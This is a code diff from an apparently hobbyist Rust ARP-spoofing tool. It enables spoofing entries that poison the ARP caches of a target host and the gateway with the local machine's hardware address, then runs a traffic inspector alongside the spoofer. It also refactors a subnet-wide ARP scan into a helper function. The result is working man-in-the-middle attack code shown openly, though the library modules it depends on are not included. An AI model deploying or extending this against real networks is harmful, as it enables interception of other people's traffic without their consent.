@@ -38,14 +38,16 @@ async fn main() {
     let en0_interface = tools.fetch_interface("en0");
     let en0_hw_addr = tools.fetch_hardware_address("en0").unwrap();
     let en0_ipv4 = tools.fetch_ipv4_address("en0").unwrap();
-    let ipv4_network = en0_interface.ips.as_slice().into_iter().find(|n| {
-        n.is_ipv4()
-    }).unwrap();
 
-    let ipv4_network: Option<Ipv4Network> = match ipv4_network {
-        pnet::ipnetwork::IpNetwork::V4(network) => Some(*network),
-        pnet::ipnetwork::IpNetwork::V6(_) => None,
-    };
+    /* No need for this for now */
+    // let ipv4_network = en0_interface.ips.as_slice().into_iter().find(|n| {
+    //     n.is_ipv4()
+    // }).unwrap();
+
+    // let ipv4_network: Option<Ipv4Network> = match ipv4_network {
+    //     pnet::ipnetwork::IpNetwork::V4(network) => Some(*network),
+    //     pnet::ipnetwork::IpNetwork::V6(_) => None,
+    // };
 
     let now = SystemTime::now();
     let date_time: DateTime<Utc> = chrono::DateTime::from(now);
@@ -66,32 +68,6 @@ async fn main() {
     let target = TARGET_IP_OBJ; 
 
     let query = AsyncArpQueryExecutorImpl::new(en0_interface.clone(), inspector_location);
-    // let query = Arc::from(tokio::sync::Mutex::new(query));
-
-    let all: Vec<std::net::Ipv4Addr> = ipv4_network.unwrap().into_iter().collect();
-    let mut all_spoof_entries: Vec<SpoofingEntry> = vec![];
-
-    // for ip in all {
-    //     if !BYPASS_LIST.contains(&ip) {
-    //         let spoofing_gateway_to_target = SpoofingEntry::new(gateway_location, inspector_location.hw, target_location);
-    //         let spoofing_target_to_gateway = SpoofingEntry::new(target_location, inspector_location.hw, gateway_location);
-
-    //         all_spoof_entries.push()
-    //     }
-    // }
-
-    let date = Local::now();
-    println!("{} - Starting query multiple", date.format("[%Y-%m-%d %H:%M:%S]"));
-
-   let query_multiple = query.query_multiple(all).await;
-
-   for key in query_multiple.keys() {
-        let value = query_multiple[key];
-        let date = Local::now();
-        println!("{} - {}={}", date.format("[%Y-%m-%d %H:%M:%S]"), key.to_string(), value.to_string());
-   }
-
-   return;
 
     let target_hw_addr = query.query(target).await;
 
@@ -126,13 +102,31 @@ async fn main() {
         hw: target_hw_addr,
     };
 
-
     let mut spoofer = arp::spoofer::AsyncArpSpooferImpl::new(en0_interface);
 
-    
+    let spoofing_gateway_to_target = SpoofingEntry::new(gateway_location, inspector_location.hw, target_location);
+    let spoofing_target_to_gateway = SpoofingEntry::new(target_location, inspector_location.hw, gateway_location);
 
-    // spoofer.add_entry(spoofing_gateway_to_target).await;
-    // spoofer.add_entry(spoofing_target_to_gateway).await;
+    spoofer.add_entry(spoofing_gateway_to_target).await;
+    spoofer.add_entry(spoofing_target_to_gateway).await;
 
     tokio::join!(inspector.start_inspecting(), spoofer.start_spoofing());
+}
+
+async fn query_all(ipv4_network: &Ipv4Network, query: &AsyncArpQueryExecutorImpl) {
+    let all: Vec<std::net::Ipv4Addr> = ipv4_network.into_iter().collect();
+    let mut all_spoof_entries: Vec<SpoofingEntry> = vec![];
+
+    let date = Local::now();
+    println!("{} - Starting query multiple", date.format("[%Y-%m-%d %H:%M:%S]"));
+
+   let query_multiple = query.query_multiple(all).await;
+
+   for key in query_multiple.keys() {
+        let value = query_multiple[key];
+        let date = Local::now();
+        println!("{} - {}={}", date.format("[%Y-%m-%d %H:%M:%S]"), key.to_string(), value.to_string());
+   }
+
+   return;
 }
